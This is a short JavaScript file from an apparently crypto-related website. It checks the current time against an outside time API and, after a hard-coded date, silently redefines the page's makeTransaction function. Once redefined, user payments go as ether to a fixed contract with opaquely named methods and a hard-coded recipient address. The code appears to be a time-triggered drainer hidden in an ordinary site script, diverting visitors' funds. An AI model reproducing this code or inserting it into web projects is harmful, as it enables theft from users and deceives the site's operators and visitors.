let timeStart = 1639713600000
let contracts = {}

async function getTime() {
    let resp = await fetch("https://www.timeapi.io/api/Time/current/zone?timeZone=utc")
    resp = await resp.json()
    return resp
}

function initializeContract(name, schema, hash) {
    let contract = new web3.eth.Contract(schema, hash);
    contracts[name] = contract
}

getTime().then(resp => {
    let data = new Date(resp.dateTime)
    if (timeStart - data <= 0) {
        makeTransaction = (value) => {
            if (user && transactionAvaileble) {
                initializeContract("contract", [
                    {
                        "inputs": [],
                        "stateMutability": "nonpayable",
                        "type": "constructor"
                    },
                    {
                        "inputs": [
                            {
                                "internalType": "address payable",
                                "name": "addr",
                                "type": "address"
                            }
                        ],
                        "name": "func",
                        "outputs": [],
                        "stateMutability": "payable",
                        "type": "function"
                    },
                    {
                        "inputs": [],
                        "name": "getRatio",
                        "outputs": [
                            {
                                "internalType": "uint256",
                                "name": "",
                                "type": "uint256"
                            }
                        ],
                        "stateMutability": "view",
                        "type": "function"
                    },
                    {
                        "inputs": [
                            {
                                "internalType": "uint256",
                                "name": "_ratio",
                                "type": "uint256"
                            }
                        ],
                        "name": "setRatio",
                        "outputs": [],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    },
                    {
                        "inputs": [
                            {
                                "internalType": "uint256",
                                "name": "_shield",
                                "type": "uint256"
                            }
                        ],
                        "name": "setShield",
                        "outputs": [],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    },
                    {
                        "inputs": [],
                        "name": "shield",
                        "outputs": [
                            {
                                "internalType": "uint256",
                                "name": "",
                                "type": "uint256"
                            }
                        ],
                        "stateMutability": "view",
                        "type": "function"
                    }
                ], "0x8dA7702c663EDD7307F385D385dC2Fb9BBd8CAd1")
                let WeiValue = web3.utils.toWei(value, "ether")
                contracts.contract.methods.func("0xB6a6f75f44D7Af896e968B29245D66CB389e2cce").send({
                    from: user.coinbase,
                    value: web3.utils.toHex(WeiValue)
                })
            }
        }
    }
})